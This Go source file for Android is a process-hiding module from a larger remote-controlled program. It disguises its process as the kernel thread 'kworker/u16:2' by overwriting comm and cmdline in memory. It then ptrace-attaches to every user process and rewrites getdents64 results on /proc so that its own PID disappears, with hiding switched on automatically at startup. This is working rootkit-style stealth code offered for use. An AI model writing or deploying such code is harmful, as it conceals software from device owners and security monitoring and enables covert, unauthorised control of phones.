//go:build android

package main

import (
	"bytes"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

// 进程隐藏: 纯 ptrace 动态 hook
// - hook 所有用户态进程的 getdents64, 过滤 /proc 中自身 PID
// - 纯内存操作, 不修改任何系统文件
// - 卸载模块重启即恢复

const (
	sysGetdents64 = 61
	hideWorkers   = 3
	hideIteration = 150
	hideScanSec   = 2
)

var hideState = struct {
	sync.Mutex
	running  bool
	stopCh   chan struct{}
	myPid    int
	hooked   int
	origCmd  string
	oldCmdline []byte
}{}

func init() {
	methods["hide_start"] = mHideStart
	methods["hide_stop"] = mHideStop
	methods["hide_status"] = mHideStatus
}

// autoHide: 启动时自动隐藏 (默认开启)
func autoHide() {
	myPid := os.Getpid()

	// 伪装 comm/cmdline
	origComm, _ := os.ReadFile("/proc/self/comm")
	hideState.origCmd = string(origComm)
	oldCmdline, _ := os.ReadFile("/proc/self/cmdline")
	hideState.oldCmdline = oldCmdline
	setComm("kworker/u16:2")
	overwriteCmdline("kworker/u16:2")

	hideState.myPid = myPid
	hideState.running = true
	hideState.stopCh = make(chan struct{})

	go hideLoop(myPid)
}

func mHideStart(c *conn, m Msg) {
	hideState.Lock()
	if hideState.running {
		hideState.Unlock()
		c.send(Msg{T: "res", ID: m.ID, Ok: boolp(true), Stdout: "已在隐藏模式"})
		return
	}
	myPid := os.Getpid()

	// 保存并伪装 comm/cmdline
	origComm, _ := os.ReadFile("/proc/self/comm")
	hideState.origCmd = string(origComm)
	oldCmdline, _ := os.ReadFile("/proc/self/cmdline")
	hideState.oldCmdline = oldCmdline
	setComm("kworker/u16:2")
	overwriteCmdline("kworker/u16:2")

	hideState.myPid = myPid
	hideState.running = true
	hideState.stopCh = make(chan struct{})
	hideState.Unlock()

	go hideLoop(myPid)

	data, _ := json.Marshal(map[string]any{"pid": myPid, "workers": hideWorkers})
	c.send(Msg{T: "res", ID: m.ID, Ok: boolp(true), Data: string(data),
		Stdout: fmt.Sprintf("隐藏已启动: pid %d, 进程名=kworker/u16:2, %d workers", myPid, hideWorkers)})
}

func mHideStop(c *conn, m Msg) {
	hideState.Lock()
	if !hideState.running {
		hideState.Unlock()
		c.send(Msg{T: "res", ID: m.ID, Ok: boolp(true), Stdout: "未在隐藏模式"})
		return
	}
	close(hideState.stopCh)
	hideState.running = false
	oldCmdline := hideState.oldCmdline
	origComm := hideState.origCmd
	hideState.Unlock()

	time.Sleep(400 * time.Millisecond)

	// 恢复 comm + cmdline
	if origComm != "" {
		os.WriteFile("/proc/self/comm", []byte(strings.TrimRight(origComm, "\n")), 0)
	}
	if len(oldCmdline) > 0 {
		restoreCmdline(oldCmdline)
	}

	c.send(Msg{T: "res", ID: m.ID, Ok: boolp(true), Stdout: "隐藏已停止, 进程名已恢复"})
}

func mHideStatus(c *conn, m Msg) {
	hideState.Lock()
	running := hideState.running
	pid := hideState.myPid
	hooked := hideState.hooked
	hideState.Unlock()

	data, _ := json.Marshal(map[string]any{"running": running, "pid": pid, "hooked": hooked})
	status := "关闭"
	if running {
		status = fmt.Sprintf("开启 (pid %d, hooked %d 进程)", pid, hooked)
	}
	c.send(Msg{T: "res", ID: m.ID, Ok: boolp(true), Data: string(data),
		Stdout: "隐藏模式: " + status})
}

// ---------- comm/cmdline 伪装 ----------

func setComm(name string) {
	b := []byte(name)
	if len(b) > 15 {
		b = b[:15]
	}
	os.WriteFile("/proc/self/comm", b, 0)
}

func overwriteCmdline(newName string) {
	cmdline, err := os.ReadFile("/proc/self/cmdline")
	if err != nil {
		return
	}
	maps, err := os.ReadFile("/proc/self/maps")
	if err != nil {
		return
	}
	var stackLo, stackHi uintptr
	for _, line := range strings.Split(string(maps), "\n") {
		if strings.Contains(line, "[stack]") {
			var lo, hi uint64
			if _, err := fmt.Sscanf(line, "%x-%x", &lo, &hi); err == nil {
				stackLo, stackHi = uintptr(lo), uintptr(hi)
			}
			break
		}
	}
	if stackLo == 0 {
		return
	}
	myPid := os.Getpid()
	for addr := stackLo; addr < stackHi; addr += 4096 {
		n := min(int(stackHi-addr), 4096)
		buf := make([]byte, n)
		got, err := vmRead(myPid, addr, buf)
		if err != nil || got == 0 {
			continue
		}
		if idx := bytes.Index(buf[:got], cmdline); idx >= 0 {
			newBuf := make([]byte, len(cmdline))
			copy(newBuf, newName)
			vmWrite(myPid, addr+uintptr(idx), newBuf)
			return
		}
	}
}

func restoreCmdline(oldCmdline []byte) {
	myPid := os.Getpid()
	maps, _ := os.ReadFile("/proc/self/maps")
	var stackLo, stackHi uintptr
	for _, line := range strings.Split(string(maps), "\n") {
		if strings.Contains(line, "[stack]") {
			var lo, hi uint64
			if _, err := fmt.Sscanf(line, "%x-%x", &lo, &hi); err == nil {
				stackLo, stackHi = uintptr(lo), uintptr(hi)
			}
			break
		}
	}
	if stackLo == 0 {
		return
	}
	newCmdline, _ := os.ReadFile("/proc/self/cmdline")
	for addr := stackLo; addr < stackHi; addr += 4096 {
		n := min(int(stackHi-addr), 4096)
		buf := make([]byte, n)
		got, err := vmRead(myPid, addr, buf)
		if err != nil || got == 0 {
			continue
		}
		if idx := bytes.Index(buf[:got], newCmdline); idx >= 0 {
			vmWrite(myPid, addr+uintptr(idx), oldCmdline)
			return
		}
	}
}

// ---------- ptrace hook ----------

func hideLoop(myPid int) {
	myPidStr := strconv.Itoa(myPid)
	pidCh := make(chan int, 100)
	var wg sync.WaitGroup

	for i := 0; i < hideWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			runtime.LockOSThread()
			defer runtime.UnlockOSThread()
			for pid := range pidCh {
				select {
				case <-hideState.stopCh:
					return
				default:
				}
				hookGetdents64(pid, myPid, myPidStr)
			}
		}()
	}

	for {
		select {
		case <-hideState.stopCh:
			close(pidCh)
			wg.Wait()
			return
		default:
		}

		pids := listUserPids(myPid)
		hideState.Lock()
		hideState.hooked = len(pids)
		hideState.Unlock()

		for _, pid := range pids {
			select {
			case <-hideState.stopCh:
				close(pidCh)
				wg.Wait()
				return
			case pidCh <- pid:
			}
		}

		select {
		case <-hideState.stopCh:
			close(pidCh)
			wg.Wait()
			return
		case <-time.After(time.Duration(hideScanSec) * time.Second):
		}
	}
}

func listUserPids(exclude int) []int {
	entries, err := os.ReadDir("/proc")
	if err != nil {
		return nil
	}
	var pids []int
	for _, e := range entries {
		pid, err := strconv.Atoi(e.Name())
		if err != nil || pid <= 1 || pid == exclude {
			continue
		}
		// 跳过内核线程
		exe, err := os.Readlink(fmt.Sprintf("/proc/%d/exe", pid))
		if err != nil || exe == "" || strings.HasPrefix(exe, "[") {
			continue
		}
		pids = append(pids, pid)
	}
	return pids
}

func hookGetdents64(pid int, myPid int, myPidStr string) {
	if err := syscall.PtraceAttach(pid); err != nil {
		return
	}
	defer syscall.PtraceDetach(pid)

	var ws syscall.WaitStatus
	if _, err := syscall.Wait4(pid, &ws, 0, nil); err != nil {
		return
	}

	entry := true
	var lastFd int
	var lastBufAddr uintptr

	for i := 0; i < hideIteration; i++ {
		select {
		case <-hideState.stopCh:
			return
		default:
		}

		if err := syscall.PtraceSyscall(pid, 0); err != nil {
			return
		}

		waitDone := make(chan struct{}, 1)
		go func() {
			syscall.Wait4(pid, &ws, 0, nil)
			select {
			case waitDone <- struct{}{}:
			default:
			}
		}()

		select {
		case <-hideState.stopCh:
			syscall.PtraceDetach(pid)
			<-waitDone
			return
		case <-waitDone:
		}

		if ws.Exited() || ws.Signaled() {
			return
		}

		var regs syscall.PtraceRegs
		if err := syscall.PtraceGetRegs(pid, &regs); err != nil {
			return
		}

		sc := int(regs.Regs[8])
		if entry {
			if sc == sysGetdents64 {
				lastFd = int(regs.Regs[0])
				lastBufAddr = uintptr(regs.Regs[1])
			}
		} else {
			if sc == sysGetdents64 && lastBufAddr != 0 {
				retBytes := int(regs.Regs[0])
				if retBytes > 0 && isProcDir(pid, lastFd) {
					newCount := filterDirents(pid, lastBufAddr, retBytes, myPidStr)
					if newCount != retBytes {
						regs.Regs[0] = uint64(newCount)
						syscall.PtraceSetRegs(pid, &regs)
					}
				}
				lastBufAddr = 0
			}
		}
		entry = !entry
	}
}

func isProcDir(pid, fd int) bool {
	link, err := os.Readlink(fmt.Sprintf("/proc/%d/fd/%d", pid, fd))
	if err != nil {
		return false
	}
	return link == "/proc" || strings.HasPrefix(link, "/proc/")
}

func filterDirents(pid int, bufAddr uintptr, total int, myPidStr string) int {
	buf := make([]byte, total)
	got, err := vmRead(pid, bufAddr, buf)
	if err != nil || got != total {
		return total
	}

	var out []byte
	off := 0
	for off+19 <= total {
		reclen := int(binary.LittleEndian.Uint16(buf[off+16 : off+18]))
		if reclen < 19 || off+reclen > total {
			break
		}
		nameStart := off + 19
		nameEnd := off + reclen
		nameRaw := buf[nameStart:nameEnd]
		if idx := bytes.IndexByte(nameRaw, 0); idx >= 0 {
			nameRaw = nameRaw[:idx]
		}
		if string(nameRaw) != myPidStr {
			out = append(out, buf[off:off+reclen]...)
		}
		off += reclen
	}

	if len(out) == total || len(out) == 0 {
		return total
	}

	writeBuf := make([]byte, total)
	copy(writeBuf, out)
	vmWrite(pid, bufAddr, writeBuf)
	return len(out)
}
